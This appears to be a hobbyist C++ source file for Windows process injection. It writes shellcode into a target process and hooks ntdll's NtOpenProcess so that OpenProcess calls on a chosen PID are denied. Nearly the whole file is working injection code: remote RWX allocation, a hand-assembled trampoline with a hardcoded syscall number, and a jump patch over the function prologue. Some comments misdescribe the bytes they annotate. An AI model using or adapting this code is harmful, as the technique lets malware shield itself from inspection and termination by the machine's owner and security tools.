#include "../imports.h"
#include <psapi.h>

#pragma comment(lib, "psapi.lib")

LPVOID getRemoteProcAddress(int targetPid, const char* dllName, const char* functionName);
void injectCode(int hookPid, int protectPid, const char* dllName, const char* functionName);
LPVOID injectTrampoline(HANDLE hProcess, int protectPid);
BOOL writeNOPs(HANDLE hProcess, LPVOID lpAddress, int numBytes);

/*
    This code args are 
    hookPid: what PID we r going to inject code into
    protectPid: what PID we want to deny access with OpenProcess
    
    Remember to run 
    gcc -o .\creating-hookDll.exe .\creating-hookDll.cpp
*/

/*  Description:
    Write no function instruction (nop) to shellcode
*/
BOOL writeNOPs(HANDLE hProcess, LPVOID lpAddress, int numBytes) {
    // retval return TRUE if writing finished without errors.
	BOOL retval = FALSE;

    // Alloc memory for a array of numBytes chars. 
	char* nopArray = (char*)calloc(numBytes, sizeof(char));
	char nop = 0x90;  //Hex code for "do nothing"
	for (int i = 0; i < numBytes; i++) {
		memcpy(&nopArray[i], &nop, 1);  //fill buffer with NOP bytes
	}

	if (hProcess) {
		SIZE_T numBytesWritten = 0;
		if (WriteProcessMemory(hProcess, lpAddress, nopArray, numBytes, &numBytesWritten)) {
            //write NOPs to remote process
			if (numBytesWritten == numBytes)
				retval = TRUE;
		}
	}

	return retval;
}

/*  Description:
        Inject code in hProcess to deny access to protectPID,
        modifying NtOpenProcess (located at ntdll.dll, appear in Ntddk.h)
        (Which is called by OpenProcess in Kernel32.dll (WindowsAPI))
*/
LPVOID injectTrampoline(HANDLE hProcess, int protectPid){

    //  Using values in [0, 255]
    unsigned char trampolineOpcodes[] = { 
        0x41,                           // REX prefix
        0x8B, 0x01,                     // mov eax, dword ptr [rcx]
        0x3D, 0x84, 0x10, 0x00, 0x00,   // cmp eax, 0x1084
        0x75, 0x06,                     // jne +6 (relative jump of 6 bytes)
        0xB8, 0x22, 0x00, 0x00, 0xC0,   // mov eax, 0xC0000022
        0xC3,                           // ret

        0x4C,                           // REX.W prefix
        0x8B, 0xD1,                     // mov r10, rcx
        0xB8, 0x23, 0x00, 0x00, 0x00,   // mov eax, 0x23
        0x0F, 0x05,                     // syscall
        0xC3,                           // ret 
        };
	
    //  Write protectPid starting in position 4 on trampolineOpcodes, which will overwrite 
    //  the block {...,0x84,0x10,0x00,0x00,...} (Size 4)
	memcpy(&trampolineOpcodes[4], &protectPid, 4);  //  patch the PID to protect
	long sizeOfTrampoline = sizeof(trampolineOpcodes);  //  Store size of shellcode so that we can alloc and write in memory

    //  Base address of hProcess with SIZE_T, type and permissions.
	LPVOID lpAddressTrampoline = VirtualAllocEx(hProcess, 0, sizeOfTrampoline, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    // LPVOID lpAddress = 0 makes the function determine where to allocate.

    if (!lpAddressTrampoline){
        warn("[VirtualAllocEx] failed, Error %lx", GetLastError());
        return nullptr;
    }
    okay("[VirtualAllocEx] success");

    SIZE_T bytesWritten = 0;
    //  Write trampolineOpcodes with size sizeOfTrampoline in hProcess (With write permissions), 
    //  on address lpAddressTrampoline. Saving the number of bytes written on bytesWritten and them
    //  compare to check if the injection worked.
	if (WriteProcessMemory(hProcess, lpAddressTrampoline, trampolineOpcodes, sizeOfTrampoline, &bytesWritten) && bytesWritten == sizeOfTrampoline) {
		okay("[WriteProcessMemory] success");
	}
	else {
		warn("[WriteProcessMemory] at %0x4 failed, Error %lx", lpAddressTrampoline, GetLastError());
		VirtualFreeEx(hProcess, lpAddressTrampoline, 0, MEM_RELEASE);
	}

    //  Return the address of the trampoline injected shellcode
    debug("[injectTrampoline LPVOID lpAddressTrampoline]: %p", lpAddressTrampoline);
    return lpAddressTrampoline;

}

/*  Description:
        Return the memory address in a targetPid in which a function 
        procName from dllName is called (Its working i swear)
*/
void* getRemoteProcAddress(int pid, const char* dllName, const char* functionName) {
    MODULEINFO localModuleInfo;
    void* retval = nullptr;

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProcess == NULL) {
        //  Failed to open the process
        warn("[OpenProcess] failed, Error %lx", GetLastError());
        return nullptr;
    }
    okay("[OpenProcess] success");

    DWORD reqSizeOfBuffer = 0;
    if (EnumProcessModules(hProcess, nullptr, 0, &reqSizeOfBuffer)) {
        HMODULE* hModules = (HMODULE*)malloc(reqSizeOfBuffer);
        if (EnumProcessModules(hProcess, hModules, reqSizeOfBuffer, &reqSizeOfBuffer)) {
            for (unsigned int i = 0; i < (reqSizeOfBuffer / sizeof(HMODULE)); i++) {
                TCHAR moduleName[MAX_PATH];
                if (GetModuleBaseName(hProcess, hModules[i], moduleName, MAX_PATH) <= 256) {
                    if (_stricmp(moduleName, dllName) == 0) {
                        if (GetModuleInformation(hProcess, hModules[i], &localModuleInfo, sizeof(localModuleInfo))) {
                            HMODULE localModuleAddress = GetModuleHandle(dllName);
                            FARPROC localProcAddress = GetProcAddress(localModuleAddress, functionName);
                            DWORD_PTR offset = (DWORD_PTR)localProcAddress - (DWORD_PTR)localModuleInfo.lpBaseOfDll;
                            retval = (void*)((DWORD_PTR)hModules[i] + offset);
                            debug("[getRemoteProcAddress DWORD_PTR offset]: 0x%llx", (unsigned long long)offset);
                            break;
                        }
                    }
                }
            }
        }
        free(hModules); // Free allocated memory
    }
    CloseHandle(hProcess);
    debug("[getRemoteProcAddress LPVOID retval]: %p", retval);
    return retval;
    //  Mental note: add images im saving on whatsapp to the documentation
    //  at some point
}

/*  Description:
        Primary function, inject shellcode by calling getRemoteProcAddress, 
        injectTrampoline and writeNOPs
*/
void injectCode(int hookPid, int protectPid, const char* dllName, const char* functionName){
    LPVOID retval = NULL;
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, hookPid);
    if (!hProcess){ 
        warn("[OpenProcess] failed, Error %lx", GetLastError());
        return;
    }
    //  Calls personalized getProcAddress function
	LPVOID hookAtAddress = getRemoteProcAddress(hookPid, dllName, functionName);
    /*  Address of function call
        Returns a address of hookPID in which procName of dllName is called.
        Just access the memory address with x64 or something
        Or press shift+D and find the function... You choose
    */ 
    if (!hookAtAddress) {
        warn("[getRemoteProcAddress] failed, Error %lx", GetLastError());
        return;
    }
    //  Calls personalized shellcode injection function
	LPVOID trampolineAddress = injectTrampoline(hProcess, protectPid);
    //  Address to the modified ntdll function

    if (!trampolineAddress) {
        warn("[injectTrampoline] failed, Error %lx", GetLastError());
        return;
    }

    unsigned char jumpBytes[] = { 
        0x48,                    //  REX.W 
        0xB8,                    //  mov rax, imm64
        0x4B, 0x4E, 0x41, 0x42,  // "FOOD" (lower 4 bytes of the 64-bit value)
        0x44, 0x4F, 0x4F, 0x46,  // "BANK" (upper 4 bytes of the 64-bit value)
        0xFF, 0xE0               //  jmp rax
    };
    /*
        ?
    */

    //  Overwrite {...,0x46, 0x4F, 0x4F, 0x44,...} with the address of trampolineAddress
	memcpy(&jumpBytes[2], &trampolineAddress, 8); //  patch FOOD to trampolineAddress
	int sizeOfJumpBytes = sizeof(jumpBytes);

    if (writeNOPs(hProcess, hookAtAddress, 11)) {
        //  NOP out 11 bytes in remote process at hookAtAddress
        //  Cleaning memory to insert jumpBytes without conflicts
		
		SIZE_T numBytesWritten = 0;
		if (!WriteProcessMemory(hProcess, hookAtAddress, jumpBytes, sizeOfJumpBytes, &numBytesWritten) || numBytesWritten != sizeOfJumpBytes) { 
            //  Write jumpBytes to remote process
			warn("[WriteProcessMemory] at %0x4 failed, Error %lx", hookAtAddress, GetLastError());
		}
		else {
			info("[WriteProcessMemory] success");
		}
	}
    else {
        warn("[writeNOPs] failed, Error %lx", GetLastError());
    }
    CloseHandle(hProcess);
}

int main(int argc, char *argv[]) {
    int hookPid;
    int protectPid;
    if (argc < 3) {
        info("Usage: %s <hookPid> <protectPid>", argv[0]);
        hookPid = 15088;
        protectPid = 12608;
    } 
    else {
        hookPid = atoi(argv[1]);
        protectPid = atoi(argv[2]);
    }

	injectCode(hookPid, protectPid, "ntdll.dll", "NtOpenProcess");
	system("pause");
    return 0;
}